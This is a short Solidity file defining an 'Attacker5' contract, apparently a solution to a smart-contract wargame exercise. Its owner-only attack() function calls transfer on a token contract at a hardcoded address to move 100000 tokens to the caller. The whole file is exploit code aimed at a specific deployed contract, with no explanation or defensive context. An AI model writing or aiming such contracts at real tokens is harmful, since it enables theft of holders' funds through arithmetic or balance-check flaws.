// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";

abstract contract Token {
    function transfer(address _to, uint256 _value)
        public
        virtual
        returns (bool);
}

contract Attacker5 is Ownable {
    Token target = Token(0x042112F48adb93cA5adC4b74022A00101B619d5E);

    function attack() external onlyOwner {
        target.transfer(msg.sender, 100000);
    }
}
